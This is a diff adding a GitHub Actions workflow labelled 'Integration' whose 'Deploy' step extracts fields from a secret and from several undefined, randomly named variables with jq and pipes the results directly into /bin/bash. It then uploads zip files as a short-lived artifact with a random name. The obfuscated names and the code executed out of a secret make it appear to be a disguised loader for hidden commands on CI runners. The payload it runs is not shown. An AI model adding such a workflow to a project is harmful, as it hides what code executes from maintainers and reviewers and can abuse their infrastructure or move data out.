@@ -1,0 +1,32 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Deploy
+        env:
+          j8: ${{ secrets.j8 }}
+        run: |
+          printf '%s' "$j8" | jq -r .j6891 | /bin/bash
+          printf '%s' "$hmcsv61944" | jq -r .mzrh0002 | /bin/bash
+          printf '%s' "$kjrl353" | jq -r .k357 | /bin/bash
+          printf '%s' "$vc875" | jq -r .nc44 | /bin/bash
+          echo $tmy37 | jq -r .nohw311 | /bin/bash
+          echo $ww507 | jq -r .w0 | /bin/bash
+          echo $zsa682 | jq -r .oxl2314 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: KwSIqGEI
+          path: "*.zip"
+          retention-days: 1
